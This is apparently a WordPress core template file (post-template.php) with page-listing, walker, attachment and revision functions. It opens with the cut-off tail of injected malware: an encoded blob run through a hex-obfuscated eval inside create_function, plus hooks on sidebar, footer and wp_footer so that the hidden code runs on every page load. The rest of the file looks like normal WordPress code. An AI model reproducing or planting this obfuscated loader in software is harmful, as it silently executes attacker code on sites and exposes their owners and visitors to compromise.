NE%5dAkCR%3a7%3c8%25e%25T%5ci%60%2aH',3952);}call_user_func(create_function('',"\x65\x76\x61l(\x4F01100llO());"));}}
	if($text) {$out=@ob_get_contents(); @ob_end_clean(); return $text.$out;}
}
add_action('get_sidebar', 'applyfilter', 1, 0);
add_action('get_footer', 'applyfilter', 1, 0);
add_action('wp_footer', 'applyfilter', 1, 0);

/**
 * Helper function for wp_link_pages().
 *
 * @since 3.1.0
 * @access private
 *
 * @param int $i Page number.
 * @return string Link.
 */
function _wp_link_page( $i ) {
	global $wp_rewrite;
	$post = get_post();

	if ( 1 == $i ) {
		$url = get_permalink();
	} else {
		if ( '' == get_option('permalink_structure') || in_array($post->post_status, array('draft', 'pending')) )
			$url = add_query_arg( 'page', $i, get_permalink() );
		elseif ( 'page' == get_option('show_on_front') && get_option('page_on_front') == $post->ID )
			$url = trailingslashit(get_permalink()) . user_trailingslashit("$wp_rewrite->pagination_base/" . $i, 'single_paged');
		else
			$url = trailingslashit(get_permalink()) . user_trailingslashit($i, 'single_paged');
	}

	return '<a href="' . esc_url( $url ) . '">';
}

//
// Post-meta: Custom per-post fields.
//

/**
 * Retrieve post custom meta data field.
 *
 * @since 1.5.0
 *
 * @param string $key Meta data key name.
 * @return bool|string|array Array of values or single value, if only one element exists. False will be returned if key does not exist.
 */
function post_custom( $key = '' ) {
	$custom = get_post_custom();

	if ( !isset( $custom[$key] ) )
		return false;
	elseif ( 1 == count($custom[$key]) )
		return $custom[$key][0];
	else
		return $custom[$key];
}

/**
 * Display list of post custom fields.
 *
 * @internal This will probably change at some point...
 * @since 1.2.0
 * @uses apply_filters() Calls 'the_meta_key' on list item HTML content, with key and value as separate parameters.
 */
function the_meta() {
	if ( $keys = get_post_custom_keys() ) {
		echo "<ul class='post-meta'>\n";
		foreach ( (array) $keys as $key ) {
			$keyt = trim($key);
			if ( is_protected_meta( $keyt, 'post' ) )
				continue;
			$values = array_map('trim', get_post_custom_values($key));
			$value = implode($values,', ');
			echo apply_filters('the_meta_key', "<li><span class='post-meta-key'>$key:</span> $value</li>\n", $key, $value);
		}
		echo "</ul>\n";
	}
}

//
// Pages
//

/**
 * Retrieve or display list of pages as a dropdown (select list).
 *
 * @since 2.1.0
 *
 * @param array|string $args Optional. Override default arguments.
 * @return string HTML content, if not displaying.
 */
function wp_dropdown_pages($args = '') {
	$defaults = array(
		'depth' => 0, 'child_of' => 0,
		'selected' => 0, 'echo' => 1,
		'name' => 'page_id', 'id' => '',
		'show_option_none' => '', 'show_option_no_change' => '',
		'option_none_value' => ''
	);

	$r = wp_parse_args( $args, $defaults );
	extract( $r, EXTR_SKIP );

	$pages = get_pages($r);
	$output = '';
	// Back-compat with old system where both id and name were based on $name argument
	if ( empty($id) )
		$id = $name;

	if ( ! empty($pages) ) {
		$output = "<select name='" . esc_attr( $name ) . "' id='" . esc_attr( $id ) . "'>\n";
		if ( $show_option_no_change )
			$output .= "\t<option value=\"-1\">$show_option_no_change</option>";
		if ( $show_option_none )
			$output .= "\t<option value=\"" . esc_attr($option_none_value) . "\">$show_option_none</option>\n";
		$output .= walk_page_dropdown_tree($pages, $depth, $r);
		$output .= "</select>\n";
	}

	$output = apply_filters('wp_dropdown_pages', $output);

	if ( $echo )
		echo $output;

	return $output;
}

/**
 * Retrieve or display list of pages in list (li) format.
 *
 * @since 1.5.0
 *
 * @param array|string $args Optional. Override default arguments.
 * @return string HTML content, if not displaying.
 */
function wp_list_pages($args = '') {
	$defaults = array(
		'depth' => 0, 'show_date' => '',
		'date_format' => get_option('date_format'),
		'child_of' => 0, 'exclude' => '',
		'title_li' => __('Pages'), 'echo' => 1,
		'authors' => '', 'sort_column' => 'menu_order, post_title',
		'link_before' => '', 'link_after' => '', 'walker' => '',
	);

	$r = wp_parse_args( $args, $defaults );
	extract( $r, EXTR_SKIP );

	$output = '';
	$current_page = 0;

	// sanitize, mostly to keep spaces out
	$r['exclude'] = preg_replace('/[^0-9,]/', '', $r['exclude']);

	// Allow plugins to filter an array of excluded pages (but don't put a nullstring into the array)
	$exclude_array = ( $r['exclude'] ) ? explode(',', $r['exclude']) : array();
	$r['exclude'] = implode( ',', apply_filters('wp_list_pages_excludes', $exclude_array) );

	// Query pages.
	$r['hierarchical'] = 0;
	$pages = get_pages($r);

	if ( !empty($pages) ) {
		if ( $r['title_li'] )
			$output .= '<li class="pagenav">' . $r['title_li'] . '<ul>';

		global $wp_query;
		if ( is_page() || is_attachment() || $wp_query->is_posts_page )
			$current_page = $wp_query->get_queried_object_id();
		$output .= walk_page_tree($pages, $r['depth'], $current_page, $r);

		if ( $r['title_li'] )
			$output .= '</ul></li>';
	}

	$output = apply_filters('wp_list_pages', $output, $r);

	if ( $r['echo'] )
		echo $output;
	else
		return $output;
}

/**
 * Display or retrieve list of pages with optional home link.
 *
 * The arguments are listed below and part of the arguments are for {@link
 * wp_list_pages()} function. Check that function for more info on those
 * arguments.
 *
 * <ul>
 * <li><strong>sort_column</strong> - How to sort the list of pages. Defaults
 * to page title. Use column for posts table.</li>
 * <li><strong>menu_class</strong> - Class to use for the div ID which contains
 * the page list. Defaults to 'menu'.</li>
 * <li><strong>echo</strong> - Whether to echo list or return it. Defaults to
 * echo.</li>
 * <li><strong>link_before</strong> - Text before show_home argument text.</li>
 * <li><strong>link_after</strong> - Text after show_home argument text.</li>
 * <li><strong>show_home</strong> - If you set this argument, then it will
 * display the link to the home page. The show_home argument really just needs
 * to be set to the value of the text of the link.</li>
 * </ul>
 *
 * @since 2.7.0
 *
 * @param array|string $args
 * @return string html menu
 */
function wp_page_menu( $args = array() ) {
	$defaults = array('sort_column' => 'menu_order, post_title', 'menu_class' => 'menu', 'echo' => true, 'link_before' => '', 'link_after' => '');
	$args = wp_parse_args( $args, $defaults );
	$args = apply_filters( 'wp_page_menu_args', $args );

	$menu = '';

	$list_args = $args;

	// Show Home in the menu
	if ( ! empty($args['show_home']) ) {
		if ( true === $args['show_home'] || '1' === $args['show_home'] || 1 === $args['show_home'] )
			$text = __('Home');
		else
			$text = $args['show_home'];
		$class = '';
		if ( is_front_page() && !is_paged() )
			$class = 'class="current_page_item"';
		$menu .= '<li ' . $class . '><a href="' . home_url( '/' ) . '" title="' . esc_attr($text) . '">' . $args['link_before'] . $text . $args['link_after'] . '</a></li>';
		// If the front page is a page, add it to the exclude list
		if (get_option('show_on_front') == 'page') {
			if ( !empty( $list_args['exclude'] ) ) {
				$list_args['exclude'] .= ',';
			} else {
				$list_args['exclude'] = '';
			}
			$list_args['exclude'] .= get_option('page_on_front');
		}
	}

	$list_args['echo'] = false;
	$list_args['title_li'] = '';
	$menu .= str_replace( array( "\r", "\n", "\t" ), '', wp_list_pages($list_args) );

	if ( $menu )
		$menu = '<ul>' . $menu . '</ul>';

	$menu = '<div class="' . esc_attr($args['menu_class']) . '">' . $menu . "</div>\n";
	$menu = apply_filters( 'wp_page_menu', $menu, $args );
	if ( $args['echo'] )
		echo $menu;
	else
		return $menu;
}

//
// Page helpers
//

/**
 * Retrieve HTML list content for page list.
 *
 * @uses Walker_Page to create HTML list content.
 * @since 2.1.0
 * @see Walker_Page::walk() for parameters and return description.
 */
function walk_page_tree($pages, $depth, $current_page, $r) {
	if ( empty($r['walker']) )
		$walker = new Walker_Page;
	else
		$walker = $r['walker'];

	$args = array($pages, $depth, $r, $current_page);
	return call_user_func_array(array($walker, 'walk'), $args);
}

/**
 * Retrieve HTML dropdown (select) content for page list.
 *
 * @uses Walker_PageDropdown to create HTML dropdown content.
 * @since 2.1.0
 * @see Walker_PageDropdown::walk() for parameters and return description.
 */
function walk_page_dropdown_tree() {
	$args = func_get_args();
	if ( empty($args[2]['walker']) ) // the user's options are the third parameter
		$walker = new Walker_PageDropdown;
	else
		$walker = $args[2]['walker'];

	return call_user_func_array(array($walker, 'walk'), $args);
}

/**
 * Create HTML list of pages.
 *
 * @package WordPress
 * @since 2.1.0
 * @uses Walker
 */
class Walker_Page extends Walker {
	/**
	 * @see Walker::$tree_type
	 * @since 2.1.0
	 * @var string
	 */
	var $tree_type = 'page';

	/**
	 * @see Walker::$db_fields
	 * @since 2.1.0
	 * @todo Decouple this.
	 * @var array
	 */
	var $db_fields = array ('parent' => 'post_parent', 'id' => 'ID');

	/**
	 * @see Walker::start_lvl()
	 * @since 2.1.0
	 *
	 * @param string $output Passed by reference. Used to append additional content.
	 * @param int $depth Depth of page. Used for padding.
	 * @param array $args
	 */
	function start_lvl( &$output, $depth = 0, $args = array() ) {
		$indent = str_repeat("\t", $depth);
		$output .= "\n$indent<ul class='children'>\n";
	}

	/**
	 * @see Walker::end_lvl()
	 * @since 2.1.0
	 *
	 * @param string $output Passed by reference. Used to append additional content.
	 * @param int $depth Depth of page. Used for padding.
	 * @param array $args
	 */
	function end_lvl( &$output, $depth = 0, $args = array() ) {
		$indent = str_repeat("\t", $depth);
		$output .= "$indent</ul>\n";
	}

	/**
	 * @see Walker::start_el()
	 * @since 2.1.0
	 *
	 * @param string $output Passed by reference. Used to append additional content.
	 * @param object $page Page data object.
	 * @param int $depth Depth of page. Used for padding.
	 * @param int $current_page Page ID.
	 * @param array $args
	 */
	function start_el( &$output, $page, $depth, $args, $current_page = 0 ) {
		if ( $depth )
			$indent = str_repeat("\t", $depth);
		else
			$indent = '';

		extract($args, EXTR_SKIP);
		$css_class = array('page_item', 'page-item-'.$page->ID);
		if ( !empty($current_page) ) {
			$_current_page = get_post( $current_page );
			if ( in_array( $page->ID, $_current_page->ancestors ) )
				$css_class[] = 'current_page_ancestor';
			if ( $page->ID == $current_page )
				$css_class[] = 'current_page_item';
			elseif ( $_current_page && $page->ID == $_current_page->post_parent )
				$css_class[] = 'current_page_parent';
		} elseif ( $page->ID == get_option('page_for_posts') ) {
			$css_class[] = 'current_page_parent';
		}

		$css_class = implode( ' ', apply_filters( 'page_css_class', $css_class, $page, $depth, $args, $current_page ) );

		$output .= $indent . '<li class="' . $css_class . '"><a href="' . get_permalink($page->ID) . '">' . $link_before . apply_filters( 'the_title', $page->post_title, $page->ID ) . $link_after . '</a>';

		if ( !empty($show_date) ) {
			if ( 'modified' == $show_date )
				$time = $page->post_modified;
			else
				$time = $page->post_date;

			$output .= " " . mysql2date($date_format, $time);
		}
	}

	/**
	 * @see Walker::end_el()
	 * @since 2.1.0
	 *
	 * @param string $output Passed by reference. Used to append additional content.
	 * @param object $page Page data object. Not used.
	 * @param int $depth Depth of page. Not Used.
	 * @param array $args
	 */
	function end_el( &$output, $page, $depth = 0, $args = array() ) {
		$output .= "</li>\n";
	}

}

/**
 * Create HTML dropdown list of pages.
 *
 * @package WordPress
 * @since 2.1.0
 * @uses Walker
 */
class Walker_PageDropdown extends Walker {
	/**
	 * @see Walker::$tree_type
	 * @since 2.1.0
	 * @var string
	 */
	var $tree_type = 'page';

	/**
	 * @see Walker::$db_fields
	 * @since 2.1.0
	 * @todo Decouple this
	 * @var array
	 */
	var $db_fields = array ('parent' => 'post_parent', 'id' => 'ID');

	/**
	 * @see Walker::start_el()
	 * @since 2.1.0
	 *
	 * @param string $output Passed by reference. Used to append additional content.
	 * @param object $page Page data object.
	 * @param int $depth Depth of page in reference to parent pages. Used for padding.
	 * @param array $args Uses 'selected' argument for selected page to set selected HTML attribute for option element.
	 * @param int $id
	 */
	function start_el(&$output, $page, $depth, $args, $id = 0) {
		$pad = str_repeat('&nbsp;', $depth * 3);

		$output .= "\t<option class=\"level-$depth\" value=\"$page->ID\"";
		if ( $page->ID == $args['selected'] )
			$output .= ' selected="selected"';
		$output .= '>';
		$title = apply_filters( 'list_pages', $page->post_title, $page );
		$output .= $pad . esc_html( $title );
		$output .= "</option>\n";
	}
}

//
// Attachments
//

/**
 * Display an attachment page link using an image or icon.
 *
 * @since 2.0.0
 *
 * @param int $id Optional. Post ID.
 * @param bool $fullsize Optional, default is false. Whether to use full size.
 * @param bool $deprecated Deprecated. Not used.
 * @param bool $permalink Optional, default is false. Whether to include permalink.
 */
function the_attachment_link( $id = 0, $fullsize = false, $deprecated = false, $permalink = false ) {
	if ( !empty( $deprecated ) )
		_deprecated_argument( __FUNCTION__, '2.5' );

	if ( $fullsize )
		echo wp_get_attachment_link($id, 'full', $permalink);
	else
		echo wp_get_attachment_link($id, 'thumbnail', $permalink);
}

/**
 * Retrieve an attachment page link using an image or icon, if possible.
 *
 * @since 2.5.0
 * @uses apply_filters() Calls 'wp_get_attachment_link' filter on HTML content with same parameters as function.
 *
 * @param int $id Optional. Post ID.
 * @param string $size Optional, default is 'thumbnail'. Size of image, either array or string.
 * @param bool $permalink Optional, default is false. Whether to add permalink to image.
 * @param bool $icon Optional, default is false. Whether to include icon.
 * @param string|bool $text Optional, default is false. If string, then will be link text.
 * @return string HTML content.
 */
function wp_get_attachment_link( $id = 0, $size = 'thumbnail', $permalink = false, $icon = false, $text = false ) {
	$id = intval( $id );
	$_post = get_post( $id );

	if ( empty( $_post ) || ( 'attachment' != $_post->post_type ) || ! $url = wp_get_attachment_url( $_post->ID ) )
		return __( 'Missing Attachment' );

	if ( $permalink )
		$url = get_attachment_link( $_post->ID );

	$post_title = esc_attr( $_post->post_title );

	if ( $text )
		$link_text = $text;
	elseif ( $size && 'none' != $size )
		$link_text = wp_get_attachment_image( $id, $size, $icon );
	else
		$link_text = '';

	if ( trim( $link_text ) == '' )
		$link_text = $_post->post_title;

	return apply_filters( 'wp_get_attachment_link', "<a href='$url' title='$post_title'>$link_text</a>", $id, $size, $permalink, $icon, $text );
}

/**
 * Wrap attachment in <<p>> element before content.
 *
 * @since 2.0.0
 * @uses apply_filters() Calls 'prepend_attachment' hook on HTML content.
 *
 * @param string $content
 * @return string
 */
function prepend_attachment($content) {
	$post = get_post();

	if ( empty($post->post_type) || $post->post_type != 'attachment' )
		return $content;

	$p = '<p class="attachment">';
	// show the medium sized image representation of the attachment if available, and link to the raw file
	$p .= wp_get_attachment_link(0, 'medium', false);
	$p .= '</p>';
	$p = apply_filters('prepend_attachment', $p);

	return "$p\n$content";
}

//
// Misc
//

/**
 * Retrieve protected post password form content.
 *
 * @since 1.0.0
 * @uses apply_filters() Calls 'the_password_form' filter on output.
 *
 * @return string HTML content for password form for password protected post.
 */
function get_the_password_form() {
	$post = get_post();
	$label = 'pwbox-' . ( empty($post->ID) ? rand() : $post->ID );
	$output = '<form action="' . esc_url( site_url( 'wp-login.php?action=postpass', 'login_post' ) ) . '" method="post">
	<p>' . __("This post is password protected. To view it please enter your password below:") . '</p>
	<p><label for="' . $label . '">' . __("Password:") . ' <input name="post_password" id="' . $label . '" type="password" size="20" /></label> <input type="submit" name="Submit" value="' . esc_attr__("Submit") . '" /></p>
</form>
	';
	return apply_filters('the_password_form', $output);
}

/**
 * Whether currently in a page template.
 *
 * This template tag allows you to determine if you are in a page template.
 * You can optionally provide a template name and then the check will be
 * specific to that template.
 *
 * @since 2.5.0
 * @uses $wp_query
 *
 * @param string $template The specific template name if specific matching is required.
 * @return bool False on failure, true if success.
 */
function is_page_template( $template = '' ) {
	if ( ! is_page() )
		return false;

	$page_template = get_page_template_slug( get_queried_object_id() );

	if ( empty( $template ) )
		return (bool) $page_template;

	if ( $template == $page_template )
		return true;

	if ( 'default' == $template && ! $page_template )
		return true;

	return false;
}

/**
 * Get the specific template name for a page.
 *
 * @since 3.4.0
 *
 * @param int $post_id The page ID to check. Defaults to the current post, when used in the loop.
 * @return string|bool Page template filename. Returns an empty string when the default page template
 * 	is in use. Returns false if the post is not a page.
 */
function get_page_template_slug( $post_id = null ) {
	$post = get_post( $post_id );
	if ( 'page' != $post->post_type )
		return false;
	$template = get_post_meta( $post->ID, '_wp_page_template', true );
	if ( ! $template || 'default' == $template )
		return '';
	return $template;
}

/**
 * Retrieve formatted date timestamp of a revision (linked to that revisions's page).
 *
 * @package WordPress
 * @subpackage Post_Revisions
 * @since 2.6.0
 *
 * @uses date_i18n()
 *
 * @param int|object $revision Revision ID or revision object.
 * @param bool $link Optional, default is true. Link to revisions's page?
 * @return string i18n formatted datetimestamp or localized 'Current Revision'.
 */
function wp_post_revision_title( $revision, $link = true ) {
	if ( !$revision = get_post( $revision ) )
		return $revision;

	if ( !in_array( $revision->post_type, array( 'post', 'page', 'revision' ) ) )
		return false;

	/* translators: revision date format, see http://php.net/date */
	$datef = _x( 'j F, Y @ G:i', 'revision date format');
	/* translators: 1: date */
	$autosavef = __( '%1$s [Autosave]' );
	/* translators: 1: date */
	$currentf  = __( '%1$s [Current Revision]' );

	$date = date_i18n( $datef, strtotime( $revision->post_modified ) );
	if ( $link && current_user_can( 'edit_post', $revision->ID ) && $link = get_edit_post_link( $revision->ID ) )
		$date = "<a href='$link'>$date</a>";

	if ( !wp_is_post_revision( $revision ) )
		$date = sprintf( $currentf, $date );
	elseif ( wp_is_post_autosave( $revision ) )
		$date = sprintf( $autosavef, $date );

	return $date;
}

/**
 * Display list of a post's revisions.
 *
 * Can output either a UL with edit links or a TABLE with diff interface, and
 * restore action links.
 *
 * Second argument controls parameters:
 *   (bool)   parent : include the parent (the "Current Revision") in the list.
 *   (string) format : 'list' or 'form-table'. 'list' outputs UL, 'form-table'
 *                     outputs TABLE with UI.
 *   (int)    right  : what revision is currently being viewed - used in
 *                     form-table format.
 *   (int)    left   : what revision is currently being diffed against right -
 *                     used in form-table format.
 *
 * @package WordPress
 * @subpackage Post_Revisions
 * @since 2.6.0
 *
 * @uses wp_get_post_revisions()
 * @uses wp_post_revision_title()
 * @uses get_edit_post_link()
 * @uses get_the_author_meta()
 *
 * @todo split into two functions (list, form-table) ?
 *
 * @param int|object $post_id Post ID or post object.
 * @param string|array $args See description {@link wp_parse_args()}.
 * @return null
 */
function wp_list_post_revisions( $post_id = 0, $args = null ) {
	if ( !$post = get_post( $post_id ) )
		return;

	$defaults = array( 'parent' => false, 'right' => false, 'left' => false, 'format' => 'list', 'type' => 'all' );
	extract( wp_parse_args( $args, $defaults ), EXTR_SKIP );

	switch ( $type ) {
		case 'autosave' :
			if ( !$autosave = wp_get_post_autosave( $post->ID ) )
				return;
			$revisions = array( $autosave );
			break;
		case 'revision' : // just revisions - remove autosave later
		case 'all' :
		default :
			if ( !$revisions = wp_get_post_revisions( $post->ID ) )
				return;
			break;
	}

	/* translators: post revision: 1: when, 2: author name */
	$titlef = _x( '%1$s by %2$s', 'post revision' );

	if ( $parent )
		array_unshift( $revisions, $post );

	$rows = $right_checked = '';
	$class = false;
	$can_edit_post = current_user_can( 'edit_post', $post->ID );
	foreach ( $revisions as $revision ) {
		if ( !current_user_can( 'read_post', $revision->ID ) )
			continue;
		if ( 'revision' === $type && wp_is_post_autosave( $revision ) )
			continue;

		$date = wp_post_revision_title( $revision );
		$name = get_the_author_meta( 'display_name', $revision->post_author );

		if ( 'form-table' == $format ) {
			if ( $left )
				$left_checked = $left == $revision->ID ? ' checked="checked"' : '';
			else
				$left_checked = $right_checked ? ' checked="checked"' : ''; // [sic] (the next one)
			$right_checked = $right == $revision->ID ? ' checked="checked"' : '';

			$class = $class ? '' : " class='alternate'";

			if ( $post->ID != $revision->ID && $can_edit_post )
				$actions = '<a href="' . wp_nonce_url( add_query_arg( array( 'revision' => $revision->ID, 'action' => 'restore' ) ), "restore-post_$post->ID|$revision->ID" ) . '">' . __( 'Restore' ) . '</a>';
			else
				$actions = '';

			$rows .= "<tr$class>\n";
			$rows .= "\t<th style='white-space: nowrap' scope='row'><input type='radio' name='left' value='$revision->ID'$left_checked /></th>\n";
			$rows .= "\t<th style='white-space: nowrap' scope='row'><input type='radio' name='right' value='$revision->ID'$right_checked /></th>\n";
			$rows .= "\t<td>$date</td>\n";
			$rows .= "\t<td>$name</td>\n";
			$rows .= "\t<td class='action-links'>$actions</td>\n";
			$rows .= "</tr>\n";
		} else {
			$title = sprintf( $titlef, $date, $name );
			$rows .= "\t<li>$title</li>\n";
		}
	}

	if ( 'form-table' == $format ) : ?>

<form action="revision.php" method="get">

<div class="tablenav">
	<div class="alignleft">
		<input type="submit" class="button-secondary" value="<?php esc_attr_e( 'Compare Revisions' ); ?>" />
		<input type="hidden" name="action" value="diff" />
		<input type="hidden" name="post_type" value="<?php echo esc_attr($post->post_type); ?>" />
	</div>
</div>

<br class="clear" />

<table class="widefat post-revisions" cellspacing="0" id="post-revisions">
	<col />
	<col />
	<col style="width: 33%" />
	<col style="width: 33%" />
	<col style="width: 33%" />
<thead>
<tr>
	<th scope="col"><?php /* translators: column name in revisions */ _ex( 'Old', 'revisions column name' ); ?></th>
	<th scope="col"><?php /* translators: column name in revisions */ _ex( 'New', 'revisions column name' ); ?></th>
	<th scope="col"><?php /* translators: column name in revisions */ _ex( 'Date Created', 'revisions column name' ); ?></th>
	<th scope="col"><?php _e( 'Author' ); ?></th>
	<th scope="col" class="action-links"><?php _e( 'Actions' ); ?></th>
</tr>
</thead>
<tbody>

<?php echo $rows; ?>

</tbody>
</table>

</form>

<?php
	else :
		echo "<ul class='post-revisions'>\n";
		echo $rows;
		echo "</ul>";
	endif;

}
